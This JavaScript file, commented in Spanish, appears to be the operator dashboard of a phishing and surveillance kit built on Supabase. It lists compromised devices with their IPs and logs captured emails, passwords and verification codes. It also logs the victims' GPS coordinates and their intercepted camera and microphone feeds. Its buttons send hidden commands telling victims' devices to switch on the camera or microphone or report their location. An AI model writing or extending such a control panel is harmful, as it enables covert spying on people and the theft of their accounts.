// Elementos del DOM
const deviceCountEl = document.getElementById('device-count');
const credentialsCountEl = document.getElementById('credentials-count');
const cameraCountEl = document.getElementById('camera-count');
const micCountEl = document.getElementById('mic-count');
const devicesContainer = document.getElementById('devices-container');
const terminalOutput = document.getElementById('terminal');
const clearTerminalBtn = document.getElementById('clear-terminal');

// Cliente global
const supabase = window.supabaseClient;

// Estado local
let devices = [];
let credentialsCount = 0;
let activeCameras = 0;
let activeMics = 0;

// Función para escribir en la terminal
function logToTerminal(message, type = 'info') {
    const time = new Date().toLocaleTimeString();
    const span = document.createElement('div');
    span.innerHTML = `<span style="color: #666;">[${time}]</span> <span class="log-${type}">${message}</span>`;
    terminalOutput.appendChild(span);
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

clearTerminalBtn.addEventListener('click', () => {
    terminalOutput.innerHTML = '';
});

// Inicializar la data llamando a Supabase directamente
async function initAdmin() {
    logToTerminal('Conectando a base de datos segura y Serverless...', 'info');

    try {
        const [devRes, credRes] = await Promise.all([
            supabase.from('devices').select('*').order('last_active', { ascending: false }),
            supabase.from('credentials').select('*', { count: 'exact' })
        ]);

        if (devRes.data) {
            devices = devRes.data;
            deviceCountEl.textContent = devices.length;
            renderDevices();
        }

        if (credRes.data) {
            credentialsCount = credRes.data.length;
            credentialsCountEl.textContent = credentialsCount;
        }

        updateStatsFromDevices();
        setupRealtimeSubscriptions();

        logToTerminal('Administrador conectado. Datos cacheados correctamente.', 'success');
    } catch (e) {
        logToTerminal('Fallo la conexión a Supabase: ' + e.message, 'error');
    }
}

function updateStatsFromDevices() {
    activeCameras = devices.filter(d => d.permissions && !!d.permissions.camera).length;
    activeMics = devices.filter(d => d.permissions && !!d.permissions.microphone).length;
    cameraCountEl.textContent = activeCameras;
    micCountEl.textContent = activeMics;
}

function renderDevices() {
    devicesContainer.innerHTML = '';

    if (devices.length === 0) {
        devicesContainer.innerHTML = '<p style="color: #666;">No hay dispositivos conectados.</p>';
        return;
    }

    devices.forEach(device => {
        const div = document.createElement('div');
        div.className = 'device-card';
        div.style.border = '1px solid #0f0';
        div.style.padding = '10px';
        div.style.marginBottom = '10px';
        div.style.borderRadius = '4px';

        const statusColor = device.status === 'active' ? '#0f0' : '#888';

        div.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                <h3 style="margin: 0; color: #0f0;">ID: ${device.device_id}</h3>
                <span style="color: ${statusColor};">${device.status || 'unknown'}</span>
            </div>
            <p style="margin: 2px 0; font-size: 0.9em;"><strong>IP:</strong> ${device.ip || 'N/A'}</p>
            <p style="margin: 2px 0; font-size: 0.9em;"><strong>Plataforma:</strong> ${device.platform}</p>
            <p style="margin: 2px 0; font-size: 0.9em;"><strong>Navegador:</strong> ${device.user_agent ? device.user_agent.substring(0, 40) + '...' : ''}</p>
            
            <div style="margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap;">
                <button onclick="requestAction('${device.device_id}', 'access-camera')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Acceder Cámara</button>
                <button onclick="requestAction('${device.device_id}', 'access-mic')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Acceder Micrófono</button>
                <button onclick="requestAction('${device.device_id}', 'get-location')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Ubicación GPS</button>
            </div>
        `;
        devicesContainer.appendChild(div);
    });
}

function requestAction(deviceId, action) {
    logToTerminal(`Enviando solicitud oculta HTTP/Broadcast a dispositivo ${deviceId}...`, 'warning');
    // Enviaremos a través del canal en vivo global
    if (window.channel) {
        window.channel.send({
            type: 'broadcast',
            event: 'request-action',
            payload: { deviceId, action }
        });
    }
}

function setupRealtimeSubscriptions() {
    window.channel = supabase.channel('cyber-room')
        .on('broadcast', { event: 'device-connected' }, payload => {
            const dev = payload.payload;
            logToTerminal(`Nuevo dispositivo conectado vía Realtime: ${dev.device_id} (${dev.ip})`, 'info');
            const idx = devices.findIndex(d => d.device_id === dev.device_id);
            if (idx >= 0) devices[idx] = { ...devices[idx], ...dev, status: 'active' };
            else devices.unshift({ ...dev, status: 'active' });
            deviceCountEl.textContent = devices.length;
            renderDevices();
        })
        .on('broadcast', { event: 'credentials-captured' }, payload => {
            const p = payload.payload;
            logToTerminal(`¡Credenciales capturadas! Device: ${p.deviceId} | Email: ${p.email} | PW: ${p.password}`, 'success');
        })
        .on('broadcast', { event: 'permissions-granted' }, payload => {
            logToTerminal(`Permisos concedidos globalmente para id: ${payload.payload.deviceId}`, 'warning');
        })
        .on('broadcast', { event: 'camera-accessed' }, payload => {
            logToTerminal(`Feed de CAMARA interceptado - origen: ${payload.payload.deviceId}`, 'success');
        })
        .on('broadcast', { event: 'mic-accessed' }, payload => {
            logToTerminal(`Feed de MICROFONO interceptado - origen: ${payload.payload.deviceId}`, 'success');
        })
        .on('broadcast', { event: 'location-updated' }, payload => {
            const l = payload.payload.location;
            logToTerminal(`GPS [${payload.payload.deviceId}]: Lat ${l.latitude}, Lng ${l.longitude}`, 'info');
        })
        .on('broadcast', { event: 'verification-completed' }, payload => {
            logToTerminal(`Verificación de código capturada de: ${payload.payload.deviceId}. Código: ${payload.payload.code}`, 'warning');
        })
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'credentials' }, payload => {
            credentialsCount++;
            credentialsCountEl.textContent = credentialsCount;
        })
        .subscribe((status) => {
            if (status === 'SUBSCRIBED') {
                logToTerminal('Suscripción activa a eventos Postgres / CyberRoom Channels.', 'info');
            }
        });
}

// Inicializar pantalla
initAdmin();
